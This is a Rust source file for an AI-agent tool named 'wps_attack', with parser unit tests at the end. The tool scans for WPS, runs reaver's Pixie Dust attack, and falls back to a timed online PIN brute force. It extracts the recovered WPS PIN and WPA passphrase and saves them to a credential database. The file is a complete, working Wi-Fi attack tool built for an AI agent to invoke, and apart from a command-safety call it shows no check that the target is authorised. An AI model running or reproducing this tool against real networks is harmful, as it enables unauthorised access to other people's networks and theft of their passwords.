use rig::completion::ToolDefinition;
use rig::tool::Tool;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::sync::Arc;
use tokio_rusqlite::Connection;

use crate::config::Config;
use crate::tools::ToolError;

/// Arguments for the wps_attack tool.
#[derive(Deserialize)]
pub struct WpsAttackArgs {
    /// Wifi interface in monitor mode
    pub interface: String,
    /// Target BSSID
    pub bssid: String,
    /// Target channel
    pub channel: i32,
    /// Target ESSID (optional, for credential storage)
    pub essid: Option<String>,
    /// Whether to attempt online brute force after Pixie Dust fails (default true)
    pub try_brute_force: Option<bool>,
    /// Brute force timeout in seconds (default 600 = 10 minutes)
    pub brute_force_timeout_secs: Option<u64>,
    /// Run ID for DB persistence
    pub run_id: Option<i64>,
}

/// Structured result from a WPS attack attempt.
#[derive(Serialize)]
pub struct WpsAttackResult {
    /// Whether WPS was detected on this AP
    pub wps_detected: bool,
    /// Whether WPS is locked
    pub wps_locked: bool,
    /// Whether Pixie Dust attack succeeded
    pub pixie_dust_success: bool,
    /// Whether brute force attack succeeded
    pub brute_force_success: bool,
    /// WPS PIN if recovered
    pub wps_pin: Option<String>,
    /// WPA PSK if recovered via WPS
    pub psk: Option<String>,
    /// Whether brute force was stopped due to AP lockout
    pub lockout_detected: bool,
    /// Error message (error-as-value)
    pub error: Option<String>,
}

impl WpsAttackResult {
    fn error(msg: impl Into<String>) -> Self {
        Self {
            wps_detected: false,
            wps_locked: false,
            pixie_dust_success: false,
            brute_force_success: false,
            wps_pin: None,
            psk: None,
            lockout_detected: false,
            error: Some(msg.into()),
        }
    }
}

/// Tool for attacking WPS-enabled access points.
///
/// 3-phase attack:
/// 1. WPS detection via wash (15-second scan)
/// 2. Pixie Dust attack via reaver -K (fast, offline)
/// 3. Online brute force via reaver (10-minute timeout, lockout detection)
pub struct WpsAttackTool {
    #[allow(dead_code)]
    config: Arc<Config>,
    #[allow(dead_code)]
    memory: Arc<Connection>,
}

impl WpsAttackTool {
    pub fn new(config: Arc<Config>, memory: Arc<Connection>) -> Self {
        Self { config, memory }
    }
}

/// Parse reaver output for WPS PIN and WPA PSK.
///
/// Looks for lines like:
///   [+] WPS PIN: '12345678'
///   [+] WPA PSK: 'mysecretpassword'
fn parse_reaver_output(output: &str) -> (Option<String>, Option<String>) {
    let mut pin = None;
    let mut psk = None;

    for line in output.lines() {
        if line.contains("WPS PIN:")
            && let Some(val) = extract_quoted_or_trailing(line, "WPS PIN:")
        {
            pin = Some(val);
        }
        if line.contains("WPA PSK:")
            && let Some(val) = extract_quoted_or_trailing(line, "WPA PSK:")
        {
            psk = Some(val);
        }
    }

    (pin, psk)
}

/// Extract value after a label, handling both quoted ('value') and unquoted formats.
fn extract_quoted_or_trailing(line: &str, label: &str) -> Option<String> {
    let after = line.split(label).nth(1)?.trim();
    // Try single-quoted
    if let Some(inner) = after.strip_prefix('\'') {
        let end = inner.find('\'')?;
        return Some(inner[..end].to_string());
    }
    // Try unquoted -- take first whitespace-delimited token
    let token = after.split_whitespace().next()?;
    if token.is_empty() {
        return None;
    }
    Some(token.to_string())
}

impl Tool for WpsAttackTool {
    const NAME: &'static str = "wps_attack";

    type Error = ToolError;
    type Args = WpsAttackArgs;
    type Output = WpsAttackResult;

    async fn definition(&self, _prompt: String) -> ToolDefinition {
        ToolDefinition {
            name: "wps_attack".to_string(),
            description: "Attack WPS-enabled access point. Detects WPS with wash, attempts \
                Pixie Dust attack first (fast, offline), falls back to online brute force \
                via reaver. Stops on lockout detection."
                .to_string(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "interface": {
                        "type": "string",
                        "description": "Wifi interface in monitor mode (e.g., 'wlan1')"
                    },
                    "bssid": {
                        "type": "string",
                        "description": "Target BSSID (AP MAC address, e.g., 'AA:BB:CC:DD:EE:FF')"
                    },
                    "channel": {
                        "type": "integer",
                        "description": "Target AP channel number"
                    },
                    "essid": {
                        "type": "string",
                        "description": "Target ESSID (for credential storage)"
                    },
                    "try_brute_force": {
                        "type": "boolean",
                        "description": "Attempt online brute force after Pixie Dust fails (default true)"
                    },
                    "brute_force_timeout_secs": {
                        "type": "integer",
                        "description": "Brute force timeout in seconds (default 600 = 10 min)"
                    },
                    "run_id": {
                        "type": "integer",
                        "description": "Run ID for DB persistence (omit for no persistence)"
                    }
                },
                "required": ["interface", "bssid", "channel"]
            }),
        }
    }

    async fn call(&self, args: Self::Args) -> Result<Self::Output, Self::Error> {
        let try_brute_force = args.try_brute_force.unwrap_or(true);
        let brute_force_timeout = args.brute_force_timeout_secs.unwrap_or(600);

        // ── Phase 1: WPS Detection via wash ──

        let wash_cmd = format!("wash -i {} -C", args.interface);
        if let Err(e) = crate::safety::validate_command(&wash_cmd, Some(&args.interface)) {
            return Ok(WpsAttackResult::error(format!(
                "Safety validation failed for wash: {}", e
            )));
        }

        // Spawn wash, let it scan for 15 seconds, then kill
        let child = std::process::Command::new("wash")
            .args(["-i", &args.interface, "-C"])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn();

        let mut child = match child {
            Ok(c) => c,
            Err(e) => {
                return Ok(WpsAttackResult::error(format!(
                    "Failed to spawn wash: {}", e
                )));
            }
        };

        let pid = child.id();
        tokio::time::sleep(std::time::Duration::from_secs(15)).await;

        // SIGTERM via kill command
        let _ = std::process::Command::new("kill")
            .args(["-TERM", &pid.to_string()])
            .output();

        // Wait for exit with 5-second timeout
        let wait_start = std::time::Instant::now();
        loop {
            match child.try_wait() {
                Ok(Some(_)) => break,
                Ok(None) => {
                    if wait_start.elapsed().as_secs() >= 5 {
                        let _ = child.kill();
                        let _ = child.wait();
                        break;
                    }
                    std::thread::sleep(std::time::Duration::from_millis(100));
                }
                Err(_) => break,
            }
        }

        // Read wash stdout
        let wash_output = if let Some(stdout) = child.stdout.take() {
            use std::io::Read;
            let mut buf = String::new();
            let mut reader = std::io::BufReader::new(stdout);
            let _ = reader.read_to_string(&mut buf);
            buf
        } else {
            String::new()
        };

        // Parse wash output for target BSSID
        // Format: BSSID  Ch  dBm  WPSv  Lck  Vendor  ESSID
        let bssid_upper = args.bssid.to_uppercase();
        let mut wps_detected = false;
        let mut wps_locked = false;

        for line in wash_output.lines() {
            let line_upper = line.to_uppercase();
            if line_upper.contains(&bssid_upper) {
                wps_detected = true;
                // Check WPS Locked field -- "Yes" in the Lck column
                let parts: Vec<&str> = line.split_whitespace().collect();
                // Typical wash columns: BSSID(0) Ch(1) dBm(2) WPSv(3) Lck(4) Vendor(5) ESSID(6+)
                if parts.len() >= 5 && parts[4].eq_ignore_ascii_case("Yes") {
                    wps_locked = true;
                }
                break;
            }
        }

        if !wps_detected {
            return Ok(WpsAttackResult {
                wps_detected: false,
                wps_locked: false,
                pixie_dust_success: false,
                brute_force_success: false,
                wps_pin: None,
                psk: None,
                lockout_detected: false,
                error: Some("WPS not detected on target AP".to_string()),
            });
        }

        // Update wps_enabled in DB
        if let Some(run_id) = args.run_id {
            let conn = self.memory.clone();
            let bssid_clone = args.bssid.clone();
            let _ = crate::memory::update_wps_enabled(
                &conn, run_id, bssid_clone, true,
            )
            .await;
        }

        // ── Phase 2: Pixie Dust Attack ──

        let pixie_cmd = format!(
            "reaver -i {} -b {} -c {} -K -vv",
            args.interface, args.bssid, args.channel
        );
        if let Err(e) = crate::safety::validate_command(&pixie_cmd, Some(&args.interface)) {
            return Ok(WpsAttackResult {
                wps_detected,
                wps_locked,
                pixie_dust_success: false,
                brute_force_success: false,
                wps_pin: None,
                psk: None,
                lockout_detected: false,
                error: Some(format!("Safety validation failed for reaver: {}", e)),
            });
        }

        // Spawn reaver with Pixie Dust (-K), 120-second timeout
        let pixie_child = std::process::Command::new("reaver")
            .args([
                "-i", &args.interface,
                "-b", &args.bssid,
                "-c", &args.channel.to_string(),
                "-K", "-vv",
            ])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn();

        let mut pixie_child = match pixie_child {
            Ok(c) => c,
            Err(e) => {
                return Ok(WpsAttackResult {
                    wps_detected,
                    wps_locked,
                    pixie_dust_success: false,
                    brute_force_success: false,
                    wps_pin: None,
                    psk: None,
                    lockout_detected: false,
                    error: Some(format!("Failed to spawn reaver (Pixie Dust): {}", e)),
                });
            }
        };

        let pixie_pid = pixie_child.id();
        tokio::time::sleep(std::time::Duration::from_secs(120)).await;

        // Kill reaver if still running
        let _ = std::process::Command::new("kill")
            .args(["-TERM", &pixie_pid.to_string()])
            .output();

        let wait_start = std::time::Instant::now();
        loop {
            match pixie_child.try_wait() {
                Ok(Some(_)) => break,
                Ok(None) => {
                    if wait_start.elapsed().as_secs() >= 5 {
                        let _ = pixie_child.kill();
                        let _ = pixie_child.wait();
                        break;
                    }
                    std::thread::sleep(std::time::Duration::from_millis(100));
                }
                Err(_) => break,
            }
        }

        let pixie_output = if let Some(stdout) = pixie_child.stdout.take() {
            use std::io::Read;
            let mut buf = String::new();
            let mut reader = std::io::BufReader::new(stdout);
            let _ = reader.read_to_string(&mut buf);
            buf
        } else {
            String::new()
        };

        let (pin, psk) = parse_reaver_output(&pixie_output);

        if psk.is_some() {
            // Pixie Dust succeeded -- store credential
            if let Some(run_id) = args.run_id {
                let conn = self.memory.clone();
                let _ = crate::memory::insert_wifi_credential(
                    &conn,
                    Some(run_id),
                    args.bssid.clone(),
                    args.essid.clone(),
                    psk.clone().unwrap_or_default(),
                    "wps".to_string(),
                    None,
                )
                .await;
            }

            return Ok(WpsAttackResult {
                wps_detected,
                wps_locked,
                pixie_dust_success: true,
                brute_force_success: false,
                wps_pin: pin,
                psk,
                lockout_detected: false,
                error: None,
            });
        }

        // ── Phase 3: Online Brute Force ──

        if !try_brute_force {
            return Ok(WpsAttackResult {
                wps_detected,
                wps_locked,
                pixie_dust_success: false,
                brute_force_success: false,
                wps_pin: None,
                psk: None,
                lockout_detected: false,
                error: Some("Pixie Dust failed and brute force disabled".to_string()),
            });
        }

        let brute_cmd = format!(
            "reaver -i {} -b {} -c {} -vv -t 10 -d 1",
            args.interface, args.bssid, args.channel
        );
        if let Err(e) = crate::safety::validate_command(&brute_cmd, Some(&args.interface)) {
            return Ok(WpsAttackResult {
                wps_detected,
                wps_locked,
                pixie_dust_success: false,
                brute_force_success: false,
                wps_pin: None,
                psk: None,
                lockout_detected: false,
                error: Some(format!("Safety validation failed for reaver brute force: {}", e)),
            });
        }

        let brute_child = std::process::Command::new("reaver")
            .args([
                "-i", &args.interface,
                "-b", &args.bssid,
                "-c", &args.channel.to_string(),
                "-vv", "-t", "10", "-d", "1",
            ])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn();

        let mut brute_child = match brute_child {
            Ok(c) => c,
            Err(e) => {
                return Ok(WpsAttackResult {
                    wps_detected,
                    wps_locked,
                    pixie_dust_success: false,
                    brute_force_success: false,
                    wps_pin: None,
                    psk: None,
                    lockout_detected: false,
                    error: Some(format!("Failed to spawn reaver (brute force): {}", e)),
                });
            }
        };

        let brute_pid = brute_child.id();
        tokio::time::sleep(std::time::Duration::from_secs(brute_force_timeout)).await;

        // Kill reaver
        let _ = std::process::Command::new("kill")
            .args(["-TERM", &brute_pid.to_string()])
            .output();

        let wait_start = std::time::Instant::now();
        loop {
            match brute_child.try_wait() {
                Ok(Some(_)) => break,
                Ok(None) => {
                    if wait_start.elapsed().as_secs() >= 5 {
                        let _ = brute_child.kill();
                        let _ = brute_child.wait();
                        break;
                    }
                    std::thread::sleep(std::time::Duration::from_millis(100));
                }
                Err(_) => break,
            }
        }

        let brute_output = if let Some(stdout) = brute_child.stdout.take() {
            use std::io::Read;
            let mut buf = String::new();
            let mut reader = std::io::BufReader::new(stdout);
            let _ = reader.read_to_string(&mut buf);
            buf
        } else {
            String::new()
        };

        // Check for lockout patterns
        let lockout_detected = brute_output.contains("WARNING: Detected AP rate limiting")
            || brute_output
                .lines()
                .filter(|l| l.contains("WPS transaction failed"))
                .count()
                >= 3;

        let (brute_pin, brute_psk) = parse_reaver_output(&brute_output);

        if brute_psk.is_some() {
            // Brute force succeeded -- store credential
            if let Some(run_id) = args.run_id {
                let conn = self.memory.clone();
                let _ = crate::memory::insert_wifi_credential(
                    &conn,
                    Some(run_id),
                    args.bssid.clone(),
                    args.essid.clone(),
                    brute_psk.clone().unwrap_or_default(),
                    "wps".to_string(),
                    None,
                )
                .await;
            }

            return Ok(WpsAttackResult {
                wps_detected,
                wps_locked,
                pixie_dust_success: false,
                brute_force_success: true,
                wps_pin: brute_pin,
                psk: brute_psk,
                lockout_detected,
                error: None,
            });
        }

        Ok(WpsAttackResult {
            wps_detected,
            wps_locked,
            pixie_dust_success: false,
            brute_force_success: false,
            wps_pin: None,
            psk: None,
            lockout_detected,
            error: Some(if lockout_detected {
                "WPS brute force stopped: AP lockout detected".to_string()
            } else {
                "WPS attacks failed: Pixie Dust unsuccessful, brute force timed out".to_string()
            }),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_reaver_output_with_pin_and_psk() {
        let output = "[+] WPS PIN: '12345678'\n[+] WPA PSK: 'mysecretpassword'\n";
        let (pin, psk) = parse_reaver_output(output);
        assert_eq!(pin.as_deref(), Some("12345678"));
        assert_eq!(psk.as_deref(), Some("mysecretpassword"));
    }

    #[test]
    fn test_parse_reaver_output_no_match() {
        let output = "[!] Pixie Dust attack failed\n[!] WPS transaction failed\n";
        let (pin, psk) = parse_reaver_output(output);
        assert!(pin.is_none());
        assert!(psk.is_none());
    }

    #[test]
    fn test_parse_reaver_output_pin_only() {
        let output = "[+] WPS PIN: '12345678'\n[!] Failed to recover WPA key\n";
        let (pin, psk) = parse_reaver_output(output);
        assert_eq!(pin.as_deref(), Some("12345678"));
        assert!(psk.is_none());
    }

    #[test]
    fn test_extract_quoted_or_trailing_quoted() {
        let val = extract_quoted_or_trailing("[+] WPS PIN: '12345678'", "WPS PIN:");
        assert_eq!(val.as_deref(), Some("12345678"));
    }

    #[test]
    fn test_extract_quoted_or_trailing_unquoted() {
        let val = extract_quoted_or_trailing("[+] WPS PIN: 12345678", "WPS PIN:");
        assert_eq!(val.as_deref(), Some("12345678"));
    }

    #[test]
    fn test_wps_attack_result_error_helper() {
        let result = WpsAttackResult::error("test error");
        assert!(!result.wps_detected);
        assert_eq!(result.error.as_deref(), Some("test error"));
    }
}
